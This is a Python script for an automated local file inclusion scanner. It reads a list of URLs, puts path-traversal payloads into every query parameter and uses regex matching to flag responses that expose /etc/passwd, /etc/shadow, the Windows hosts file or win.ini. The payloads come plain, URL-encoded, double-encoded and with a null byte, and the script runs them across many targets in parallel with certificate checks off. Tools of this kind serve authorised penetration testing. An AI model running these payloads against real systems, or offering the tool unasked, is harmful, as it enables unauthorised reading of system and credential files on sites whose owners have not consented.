#!/usr/bin/env python3

import requests
import argparse
import logging
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
from tqdm import tqdm
import sys

# Initialize colorama for colored console output
init(autoreset=True)

# Disable SSL warnings to prevent console clutter when scanning HTTPS URLs with self-signed certificates
requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Setup logging to capture detailed scan information and errors
logging.basicConfig(
    filename='lfi_scanner.log',
    level=logging.INFO,  # Set to INFO for general logs, DEBUG for detailed logs
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Define payloads along with their associated keyword regex patterns
PAYLOAD_KEYWORDS = [
    # /etc/passwd payloads with enhanced regex patterns
    ("../../../../../../../../../../../../etc/passwd", [
        r"root:.*:0:0:",
        r"bin:.*:1:1:",
        r"daemon:.*:1:1:",
        r"\/bin\/bash",
        r"\/bin\/sh",
        r"\/usr\/bin\/nologin",
        r"\/sbin\/nologin",
    ]),
    ("%2e%2e%2f" * 10 + "etc%2fpasswd", [
        r"root:.*:0:0:",
        r"bin:.*:1:1:",
        r"daemon:.*:1:1:",
        r"\/bin\/bash",
        r"\/bin\/sh",
        r"\/usr\/bin\/nologin",
        r"\/sbin\/nologin",
    ]),
    ("..%2F" * 10 + "etc%2Fpasswd", [
        r"root:.*:0:0:",
        r"bin:.*:1:1:",
        r"daemon:.*:1:1:",
        r"\/bin\/bash",
        r"\/bin\/sh",
        r"\/usr\/bin\/nologin",
        r"\/sbin\/nologin",
    ]),
    ("..%2F" * 10 + "etc%2Fshadow", [
        r"root:[x*]!?:[0-9]*:",
        r"daemon:[x*]!?:[0-9]*:",
        r"bin:[x*]!?:[0-9]*:",
    ]),
    # Windows equivalent payloads
    ("../../../../../../../../../../../../Windows/System32/drivers/etc/hosts", [
        r"127\.0\.0\.1\s+localhost",
        r"::1\s+localhost",
    ]),
    ("../../../../../../../../../../../../Windows/System32/win.ini", [
        r"\[fonts\]",
        r"\[extensions\]",
        r"\[mci extensions\]",
        r"\[files\]",
        r"\[Mail\]",
    ]),
    # Null byte injection
    ("../../../../../../../../../../../../etc/passwd%00", [
        r"root:.*:0:0:",
    ]),
    # Double encoding
    ("%252e%252e%252f" * 10 + "etc%252fpasswd", [
        r"root:.*:0:0:",
    ]),
]

# Pre-compile all regex patterns with re.IGNORECASE and re.MULTILINE for performance and multiline matching
for i, (payload, patterns) in enumerate(PAYLOAD_KEYWORDS):
    try:
        PAYLOAD_KEYWORDS[i] = (payload, [re.compile(pattern, re.IGNORECASE | re.MULTILINE) for pattern in patterns])
    except re.error as e:
        logging.error(f"Regex compilation error for payload '{payload}': {e}")
        PAYLOAD_KEYWORDS[i] = (payload, [])

def read_urls(file_path):
    """
    Read URLs from the input file.
    Each URL should be on a separate line.
    """
    try:
        with open(file_path, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        logging.info(f"Loaded {len(urls)} URLs from {file_path}")
        return urls
    except Exception as e:
        logging.error(f"Failed to read URLs from {file_path}: {e}")
        return []

def identify_parameters(url):
    """
    Parse the URL and extract query parameters.
    Returns the base URL and parameters as a dictionary.
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    # Flatten the parameters: parse_qs returns list values
    params = {k: v[0] for k, v in params.items()}
    base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
    logging.debug(f"Identified parameters for URL {url}: {params}")
    return base_url, params

def construct_url(base_url, params):
    """
    Construct URL with updated parameters.
    """
    query = urlencode(params, doseq=True)
    return f"{base_url}?{query}"

def send_request(url, headers=None):
    """
    Send an HTTP GET request to the specified URL.
    Returns the response object if successful, else None.
    """
    try:
        response = requests.get(url, timeout=10, verify=False, allow_redirects=True, headers=headers)
        logging.debug(f"Received response for URL {url} with status code {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed for URL {url}: {e}")
        return None

def analyze_response(response, compiled_patterns):
    """
    Analyze the HTTP response for the presence of any of the keyword patterns using pre-compiled regex.
    Returns True if any pattern matches, False otherwise.
    """
    if response and response.status_code in [200, 302, 403, 404]:
        for pattern in compiled_patterns:
            try:
                if pattern.search(response.text):
                    logging.debug(f"Keyword pattern '{pattern.pattern}' matched.")
                    return True
            except re.error as regex_error:
                logging.error(f"Invalid regex pattern: {pattern.pattern} | Error: {regex_error}")
    return False

def process_url(url, verbose=False):
    """
    Process a single URL by injecting payloads into its parameters one at a time and analyzing responses.
    Returns a list of tuples with vulnerable URLs, parameter, and the payload that triggered the vulnerability.
    """
    vulnerable = []
    base_url, params = identify_parameters(url)

    if not params:
        logging.info(f"No parameters found in URL: {url}")
        return vulnerable

    for param in params:
        injected_params = params.copy()
        for payload, keyword_patterns in PAYLOAD_KEYWORDS:
            if not keyword_patterns:
                continue  # Skip if no valid regex patterns
            # Inject payload into the current parameter only
            injected_params[param] = payload
            injected_url = construct_url(base_url, injected_params)
            logging.info(f"Testing payload: {payload} on URL: {injected_url} (Parameter: {param})")
            response = send_request(injected_url)

            if analyze_response(response, keyword_patterns):
                logging.info(f"VULNERABLE: {injected_url} | Parameter: {param} | Payload: {payload}")
                result = f"[+] Vulnerable: {injected_url} | Parameter: {param} | Payload: {payload}"
                print(Fore.GREEN + result + Style.RESET_ALL)
                if verbose and response:
                    # Optionally print a snippet of the response for manual verification
                    snippet = response.text[:500] + ('...' if len(response.text) > 500 else '')
                    print(f"{Fore.YELLOW}Response Snippet:{Style.RESET_ALL}\n{snippet}\n{'-'*80}")
                vulnerable.append((injected_url, param, payload))
                # Optionally, break after finding the first vulnerability per parameter
                # break
            else:
                if verbose:
                    result = f"[-] Not Vulnerable: {injected_url} | Parameter: {param} | Payload: {payload}"
                    print(Fore.RED + result + Style.RESET_ALL)
    return vulnerable

def main():
    # Argument parsing
    parser = argparse.ArgumentParser(description='Automated LFI Scanner for common files')
    parser.add_argument('-i', '--input', required=True, help='Input file with URLs (one per line)')
    parser.add_argument('-o', '--output', required=True, help='Output file for vulnerable URLs')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of concurrent threads (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output with response snippets')
    args = parser.parse_args()

    # Read URLs from input file
    urls = read_urls(args.input)
    if not urls:
        print("No URLs to process. Please check the input file.")
        sys.exit(1)

    # Open output file for writing vulnerable URLs
    try:
        with open(args.output, 'w') as output_file:
            output_file.write("Full URL | Parameter | Payload\n")
            logging.info(f"Opened output file: {args.output}")

            # Start scanning with ThreadPoolExecutor
            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                # Submit all URLs to the executor
                futures = {executor.submit(process_url, url, args.verbose): url for url in urls}

                # Use tqdm progress bar
                with tqdm(total=len(futures), desc="Scanning URLs", unit="url") as pbar:
                    for future in as_completed(futures):
                        url = futures[future]
                        try:
                            vulnerable = future.result()
                            if vulnerable:
                                for vuln_url, param, payload in vulnerable:
                                    output_file.write(f"{vuln_url} | {param} | {payload}\n")
                            pbar.update(1)
                        except Exception as e:
                            logging.error(f"Error processing URL {url}: {e}")
                            print(f"{Fore.RED}Error processing URL {url}. Check log for details.{Style.RESET_ALL}")
                            pbar.update(1)

        print(f"\n{Fore.CYAN}Scan complete. Vulnerable URLs saved to {args.output}{Style.RESET_ALL}")
        logging.info("Scanning completed.")
    except Exception as e:
        logging.error(f"Failed to open output file {args.output}: {e}")
        print(f"{Fore.RED}Failed to open output file {args.output}. Check log for details.{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
